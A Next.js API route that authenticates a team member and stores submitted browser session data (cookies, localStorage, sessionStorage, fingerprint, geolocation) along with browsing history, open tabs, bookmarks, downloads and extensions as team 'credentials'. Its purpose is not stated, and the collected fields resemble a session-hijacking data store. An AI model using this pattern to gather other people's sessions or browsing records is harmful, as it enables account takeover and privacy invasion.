import { NextRequest, NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { credentials } from '@/lib/schema';
import { requireAuth, getUserTeamIds } from '@/lib/auth';
import { eq } from 'drizzle-orm';

export async function POST(request: NextRequest) {
  try {
    const user = await requireAuth(request);
    const userTeamIds = getUserTeamIds(user);
    
    if (userTeamIds.length === 0) {
      return NextResponse.json({ 
        success: false,
        error: 'No team access',
        message: 'User must belong to at least one team',
        data: null
      }, { status: 403 });
    }

    const body = await request.json();
    const { 
      cookies, 
      localStorage, 
      sessionStorage, 
      fingerprint, 
      geoLocation, 
      metadata,
      ipAddress,
      userAgent,
      platform,
      browser,
      browserHistory,
      tabs,
      bookmarks,
      downloads,
      extensions,
      credentialSource = 'manual' 
    } = body;

    if (!cookies && !localStorage && !sessionStorage) {
      return NextResponse.json({ 
        success: false,
        error: 'Missing credential data',
        message: 'At least cookies, localStorage, or sessionStorage data is required',
        data: null
      }, { status: 400 });
    }
    
    // Use the first team the user belongs to (or could be made configurable)
    const teamId = userTeamIds[0];
    
    // Delete existing credentials for the team
    // await db.delete(credentials).where(eq(credentials.teamId, teamId));
    
    // Prepare credential data
    const credentialData: any = {
      teamId: teamId,
      isActive: true,
      createdBy: user.id,
      credentialSource,
      
      // Browser environment data
      ipAddress: ipAddress || null,
      userAgent: userAgent || null,
      platform: platform || null,
      browser: browser || null,
      
      // JSON data (stringify for storage)
      cookies: cookies ? JSON.stringify(cookies) : null,
      localStorage: localStorage ? JSON.stringify(localStorage) : null,
      sessionStorage: sessionStorage ? JSON.stringify(sessionStorage) : null,
      fingerprint: fingerprint ? JSON.stringify(fingerprint) : null,
      geoLocation: geoLocation ? JSON.stringify(geoLocation) : null,
      metadata: metadata ? JSON.stringify(metadata) : null,
      
      // Extended browser data
      browserHistory: browserHistory ? JSON.stringify(browserHistory) : null,
      tabs: tabs ? JSON.stringify(tabs) : null,
      bookmarks: bookmarks ? JSON.stringify(bookmarks) : null,
      downloads: downloads ? JSON.stringify(downloads) : null,
      extensions: extensions ? JSON.stringify(extensions) : null
    };

    // Insert the new credential record
    const [newCredential] = await db.insert(credentials).values(credentialData).returning();

    return NextResponse.json({
      success: true,
      error: null,
      message: 'Credentials stored successfully',
      data: {
        credential: newCredential.id
      }
    });

  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: 'Server error',
      message: 'Internal server error',
      data: null
    }, { status: 500 });
  }
}
